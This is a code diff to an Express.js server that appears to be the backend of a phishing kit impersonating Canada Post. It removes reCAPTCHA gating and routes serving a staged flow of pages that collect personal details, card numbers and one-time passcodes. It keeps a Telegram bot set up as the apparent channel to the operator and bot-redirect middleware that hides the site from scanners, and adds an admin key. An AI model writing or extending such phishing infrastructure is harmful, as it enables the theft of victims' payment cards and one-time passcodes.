@@ -32,6 +32,7 @@ const app = express();
 const RECAPTCHA_SECRET_KEY = process.env.RECAPTCHA_SECRET_KEY;
 const token = process.env.TELEGRAM_BOT_API_KEY;
 const chatId = process.env.TELEGRAM_CHAT_ID;
+const adminKey = process.env.ADMIN_KEY;
 const bot = new TelegramBot(token, { polling: true });
 
 
@@ -95,38 +96,6 @@ const redirectBots = (req, res, next) => {
     next();
 };
 
-const checkRecaptchaSession = (req, res, next) => {
-
-    if (req.session.recaptchaVerified) {
-        next();
-    } else {
-        res.status(403).send('Access denied. Please complete the reCAPTCHA.');
-    }
-};
-
-
-// Middleware to verify reCAPTCHA response
-const verifyRecaptcha = (req, res, next) => {
-    const recaptchaResponse = req.body['g-recaptcha-response'];
-
-    // Verify URL
-    const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET_KEY}&response=${recaptchaResponse}`;
-
-    fetch(verifyUrl, { method: 'POST' })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                req.session.recaptchaVerified = true;
-
-                next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
-            } else {
-                res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
-            }
-        })
-        .catch(error => {
-            res.status(500).send('Error in reCAPTCHA verification, try again later.');
-        });
-};
 
 // Use this middleware in your app before your routes
 app.use(redirectBots);
@@ -140,32 +109,8 @@ app.use(bodyParser.urlencoded({ extended: true })); // for parsing application/x
 app.use(express.static('public'));
 
 app.get('/', (req, res) => {
-    res.sendFile(join(__dirname, '/captcha/page.html'));
-    //res.sendFile(join(__dirname, '/cp/details/page.html'));
-});
 
-app.post('/canada-post', verifyRecaptcha, (req, res) => {
-    // At this point, the reCAPTCHA was successful, and you can handle the form submission.
-    // Redirect the user to the desired page after form submission and reCAPTCHA verification
-    res.sendFile(join(__dirname, '/cp/start/page.html'));
 });
-
-app.get('/details', checkRecaptchaSession, (req, res) => {
-    res.sendFile(join(__dirname, '/cp/details/page.html'));
-});
-
-app.get('/card', checkRecaptchaSession, (req, res) => {
-    res.sendFile(join(__dirname, '/cp/card/page.html'));
-});
-
-app.get('/otp', checkRecaptchaSession, (req, res) => {
-    res.sendFile(join(__dirname, '/cp/otp/page.html'));
-});
-
-app.get('/finish', checkRecaptchaSession, (req, res) => {
-    res.sendFile(join(__dirname, '/cp/finish/page.html'));
-});
-
 
 
 // ====================
